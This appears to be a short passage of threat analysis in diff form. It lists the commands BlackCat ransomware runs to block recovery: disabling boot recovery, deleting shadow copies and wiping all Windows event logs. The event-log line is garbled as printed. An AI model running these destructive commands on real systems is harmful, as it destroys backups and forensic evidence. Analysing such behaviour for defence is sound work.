@@ -1,0 +1,10 @@
+BlackCat has numerous methods to make recovery efforts more difficult. The following are commands that might be launched by the payload, as well as their purposes:
+
+Modify boot loader
+“C:\Windows\system32\cmd.exe” /c “bcdedit /set {default}”
+“C:\Windows\system32\cmd.exe” /c “bcdedit /set {default} recoveryenabled No”
+Delete volume shadow copies
+“C:\Windows\system32\cmd.exe” /c “vssadmin.exe Delete Shadows /all /quiet”
+“C:\Windows\system32\cmd.exe” /c “wmic.exe Shadowcopy Delete”
+Clear Windows event logs
+“C:\Windows\system32\cmd.exe” /c “cmd.exe /c  for /F \”tokens=*\” Incorrect function. in (‘ wevtutil.exe el ‘) DO wevtutil.exe cl \”Incorrect function. \””
